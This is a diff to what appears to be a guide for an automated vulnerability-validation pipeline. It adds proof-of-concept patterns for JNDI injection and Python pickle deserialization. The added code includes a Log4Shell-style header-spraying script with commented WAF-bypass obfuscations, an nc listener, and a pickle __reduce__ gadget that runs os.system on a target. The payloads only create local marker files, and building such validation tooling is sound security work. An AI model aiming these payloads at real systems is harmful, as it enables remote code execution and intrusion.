@@ -182,7 +182,7 @@ def exploit(target, timeout):
 |------|--------------|------------|
 | RCE | Unique marker via eval/exec/template injection | TCP listener on 59875 receives `test_message` |
 | SSRF | Internal URL injection + listener | TCP listener on 59876 receives connection |
-| Insecure Deserialization | Malicious pickle/YAML payload | `/tmp/deserialized_flag` created |
+| Insecure Deserialization | Malicious Java/YAML/Ruby serialized payload via HTTP body | `/tmp/deserialized_flag` created |
 | Arbitrary File R/W | Write marker, read it back | inotifywait detects access on `/tmp/flag` |
 | DoS | ReDoS, nested JSON, XML bomb | 10× response time increase |
 | Command Injection | Shell metacharacters + marker | TCP listener on 59875 receives `test_message` |
@@ -191,6 +191,7 @@ def exploit(target, timeout):
 | IDOR | Two-user test: register user1+user2, authenticate as user1, access user2's resource via user2_id | HTTP 200 with user2's data in response body |
 | JNDI Injection (**Java only**) | Inject `${jndi:ldap://127.0.0.1:59877/id}` in all HTTP headers (User-Agent, X-Forwarded-For, etc.) | TCP callback received on port 59877 OR marker file `/tmp/jndi_confirmed_<id>` created |
 | Prototype Pollution (**JS/TS only**) | Inject `{"__proto__": {"admin": true}}` or RCE gadget payload via POST body/query param | Marker file `/tmp/pp_rce_<id>` created (RCE) OR admin property reflected in response (privesc) |
+| Pickle Deserialization (**Python only**) | Send `pickle.dumps(PickleExploit())` as HTTP body to endpoint that calls `pickle.loads()` | Marker file `/tmp/pickle_rce_<id>` created |
 
 ### SQL Injection PoC Pattern
 
@@ -332,9 +333,96 @@ def validate(result):
     return result is not None and result.get("http_code") == 200
 ```
 
+### JNDI Injection PoC Pattern (**Java targets only**)
+
+```python
+# For JNDI injection: inject ${jndi:ldap://...} via HTTP headers
+# TCP listener on port 59877 receives inbound LDAP connection from vulnerable JVM
+import secrets, time, subprocess, requests
+
+JNDI_ID = secrets.token_hex(6)
+JNDI_HEADERS = [
+    "User-Agent", "X-Forwarded-For", "X-Api-Version",
+    "X-Forwarded-Host", "Referer", "CF-Connecting-IP",
+    "X-Real-IP", "X-Custom-IP-Authorization",
+]
+PAYLOADS = [
+    f"${{jndi:ldap://127.0.0.1:59877/{JNDI_ID}}}",
+    # Obfuscated variants for WAF bypass (retry):
+    # f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://127.0.0.1:59877/{JNDI_ID}}}",
+    # f"${{jndi:rmi://127.0.0.1:59877/{JNDI_ID}}}",
+]
+
+def exploit(target, timeout):
+    # Start TCP listener to catch LDAP callback
+    listener = subprocess.Popen(
+        ["nc", "-lvnp", "59877"],
+        stdout=subprocess.PIPE, stderr=subprocess.PIPE
+    )
+    time.sleep(0.5)  # Let listener bind
+
+    for payload in PAYLOADS:
+        for header in JNDI_HEADERS:
+            try:
+                requests.get(target, headers={header: payload}, timeout=5)
+            except Exception:
+                pass
+
+    time.sleep(2)  # Wait for callback
+    listener.terminate()
+    stdout, _ = listener.communicate(timeout=3)
+    return {"callback": stdout.decode(), "jndi_id": JNDI_ID}
+
+def validate(result):
+    if not result:
+        return False
+    # TCP connection received = JNDI lookup triggered
+    return bool(result.get("callback")) or JNDI_ID in result.get("callback", "")
+```
+
+### Pickle Deserialization PoC Pattern (**Python targets only**)
+
+```python
+# For pickle deserialization: send malicious pickle payload to HTTP endpoint
+# The endpoint must call pickle.loads(request.data) or similar
+import pickle, os, secrets, requests
+
+MARKER_ID = secrets.token_hex(4)
+MARKER_FILE = f"/tmp/pickle_rce_{MARKER_ID}"
+
+class PickleExploit:
+    def __reduce__(self):
+        return (os.system, (f"touch {MARKER_FILE}",))
+
+def exploit(target, timeout):
+    payload = pickle.dumps(PickleExploit())
+    # Try common content types
+    for ct in ["application/octet-stream", "application/x-pickle", "application/pickle"]:
+        try:
+            resp = requests.post(
+                f"{target}/api/load",  # adjust to actual endpoint
+                data=payload,
+                headers={"Content-Type": ct},
+                timeout=timeout
+            )
+            # Also try base64-encoded (retry variant)
+            # import base64
+            # resp = requests.post(target_url, json={"data": base64.b64encode(payload).decode()})
+            if resp.status_code < 500:
+                break
+        except Exception:
+            pass
+    return {"marker_file": MARKER_FILE, "marker_id": MARKER_ID}
+
+def validate(result):
+    import os
+    # Check if marker file was created by the payload
+    return os.path.exists(result["marker_file"])
+```
+
 ## Naming Convention (MANDATORY)
 
-**Format**: `poc_<type>_<NNN>.py` — where `<type>` is one of the 9 supported vuln types and `<NNN>` is a 3-digit zero-padded sequential number.
+**Format**: `poc_<type>_<NNN>.py` — where `<type>` is one of the 12 supported vuln types and `<NNN>` is a 3-digit zero-padded sequential number.
 
 **Valid examples**:
 ```
@@ -347,8 +435,9 @@ poc_dos_006.py
 poc_sql_injection_007.py
 poc_xss_008.py
 poc_idor_009.py
-poc_jndi_injection_010.py        # Java targets only
-poc_prototype_pollution_011.py   # JavaScript/TypeScript targets only
+poc_jndi_injection_010.py           # Java targets only
+poc_prototype_pollution_011.py      # JavaScript/TypeScript targets only
+poc_pickle_deserialization_012.py   # Python targets only
 ```
 
 **ANTI-PATTERNS (FORBIDDEN — observed in actual pipeline runs)**:
